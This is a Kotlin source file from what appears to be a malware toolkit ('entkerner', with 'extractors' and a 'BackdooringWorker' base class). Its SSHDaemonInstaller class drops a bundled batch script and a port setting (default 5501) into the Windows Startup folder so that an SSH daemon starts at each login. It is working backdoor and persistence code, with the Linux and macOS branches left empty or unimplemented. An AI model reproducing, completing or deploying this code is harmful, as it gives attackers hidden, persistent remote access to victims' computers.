package net.kerner.entkerner.extractors.ssh

import io.ktor.client.*
import net.kerner.entkerner.Entkerner
import net.kerner.entkerner.abstract.AbstractBackdooringWorker
import net.kerner.entkerner.abstract.SystemFileURI
import net.kerner.entkerner.io.FileUtils.Linux.userHome
import net.kerner.entkerner.io.FileUtils.Windows.appData
import net.kerner.entkerner.io.JavaClassLoaderResources
import net.kerner.entkerner.io.nullPath
import net.kerner.entkerner.io.nullPaths
import net.kerner.entkerner.model.SystemType
import java.io.BufferedInputStream
import java.io.File
import java.nio.file.Path
import kotlin.io.path.div

class SSHDaemonInstaller(
    httpClient: HttpClient,
    entkerner: Entkerner,
    val port: Int = 5501
) : AbstractBackdooringWorker(httpClient, entkerner) {
    override val name = "SSHDaemonBackdooringWorker"
    override val file = object : SystemFileURI() {
        override val linux = nullPath
        override val windows = appData / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "SSHDaemon"
        override val xnu: Path
            get() = TODO("Not yet implemented")

    }

    override fun buildDoor(file: File): Boolean {
        file.mkdirs()
        when(entkerner.system) {
            SystemType.WINDOWS -> installOnWindows(file)
            else -> {}
        }
        return true
    }

    private fun installOnWindows(file: File) {
        if (entkerner.system == SystemType.WINDOWS) {
            val sshDaemonFile = File(file, "RunSshDaemon.bat")
            sshDaemonFile.createNewFile()
            sshDaemonFile.writeBytes(JavaClassLoaderResources.getResource("windows/SshDaemon.bat").readBytes())
            val sshDaemonConfigFile = File(file, "SshDaemonConf.txt")
            sshDaemonConfigFile.createNewFile()
            sshDaemonConfigFile.writeBytes(port.toString().toByteArray())
        }
    }
}